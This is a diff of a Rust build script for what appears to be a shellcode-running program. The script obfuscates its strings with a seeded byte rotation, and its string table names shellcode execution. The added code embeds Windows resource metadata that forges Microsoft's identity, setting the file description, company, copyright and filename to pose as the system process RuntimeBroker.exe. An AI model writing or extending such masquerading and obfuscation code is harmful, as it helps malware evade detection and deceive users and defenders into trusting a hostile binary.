@@ -1,7 +1,6 @@
 use std::fs;
 use std::path::Path;
 
-// FNV-1a seeded byte rotation — mimics legitimate locale resource encoding
 fn encrypt(s: &str) -> String {
     let mut seed: u32 = 0x811C_9DC5;
     let bytes: Vec<String> = s.bytes()
@@ -16,8 +15,8 @@ fn encrypt(s: &str) -> String {
 }
 
 fn main() {
+    // --- String obfuscation ---
     let mut output = String::new();
-
     let strings = vec![
         ("S_SHELLCODE_START", "Execution started"),
         ("S_SHELLCODE_DONE", "Execution completed"),
@@ -75,5 +74,24 @@ fn main() {
 
     let out_dir = std::env::var("OUT_DIR").unwrap();
     fs::write(Path::new(&out_dir).join("strings_enc.rs"), output).unwrap();
+
+    // --- Windows PE resource embedding ---
+    if std::env::var("CARGO_CFG_TARGET_OS").unwrap_or_default() == "windows" {
+        let mut res = winres::WindowsResource::new();
+        res.set_manifest_file("resources/app.manifest");
+        res.set("FileDescription", "Runtime Broker");
+        res.set("ProductName", "Microsoft\u{00ae} Windows\u{00ae} Operating System");
+        res.set("CompanyName", "Microsoft Corporation");
+        res.set("LegalCopyright", "\u{00a9} Microsoft Corporation. All rights reserved.");
+        res.set("OriginalFilename", "RuntimeBroker.exe");
+        res.set("InternalName", "RuntimeBroker.exe");
+        res.set("FileVersion", "10.0.22621.2506");
+        res.set("ProductVersion", "10.0.22621.2506");
+        if let Err(e) = res.compile() {
+            eprintln!("Warning: Failed to compile Windows resources: {}", e);
+        }
+    }
+
     println!("cargo:rerun-if-changed=build.rs");
+    println!("cargo:rerun-if-changed=resources/app.manifest");
 }
